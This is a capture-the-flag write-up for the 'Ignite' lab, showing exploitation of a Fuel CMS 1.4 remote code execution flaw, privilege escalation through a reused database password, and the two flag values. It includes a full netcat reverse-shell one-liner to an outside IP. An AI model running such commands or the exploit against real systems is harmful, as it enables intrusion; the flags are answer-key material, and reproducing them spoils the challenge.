# Ignite

### Root it!
Nmap scan shows only port 80 open. Visiting this web page, it is powered by `Fuel CMS 1.4`. Looking online this version is vulnerable to RCE (CVE-2018-16763) and I found an exploit [here](https://github.com/n3m1sys/CVE-2018-16763-Exploit-Python3/blob/master/exploit.py).
I slightly modified the exploit code so that you don't have to have an open proxy on port 8080 like burpsuite, but you can just run it from the command line. The code can be found in `exploit.py` of this folder.<br />
So now I have RCE: <br />
![image](https://github.com/user-attachments/assets/833ab8a5-0e61-46eb-ae2d-686e691ca16d)<br />
So I'm going to use it to spawn a reverse shell. Open a netcat listener and send the command `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.85.53 4444 >/tmp/f` (adapt the command to your IP and port).<br />
Next, [stabilize the shell](https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal).
This was enough to get the first flag: <br />
![image](https://github.com/user-attachments/assets/4b9003aa-0671-4938-bc0a-2de86f63ca8f)<br />
Running linpeas I found some stuff. First of all, a set of DB credentials inside `/var/www/html/fuel/application/config/database.php`:<br />
![image](https://github.com/user-attachments/assets/dcd165aa-5bb3-46f2-9d72-7a346f40b4be)<br />
These are the credentials to log into root's mysql account. But, funny enough, `mememe` it's also the password to log into root. Run `su` and provide the found password to become root and get the second flag.<br /><br />
Lesson learned: I spent an hour trying to figure out how to perform privesc, running linpeas, trying some CVE's, checking vulnerable software versions, manually enumerating configuration files...<br />
At the end the path was much simpler than that, and I learned that some times a misconfigured system can use the same password for multiple purposes. Next time I should save every possible set of credentials I can find and use them on every service that requires authentication. 





- User.txt `6470e394cbf6dab6a91682cc8585059b`
- Root.txt `b9bbcb33e11b80be759c4e844862482d`
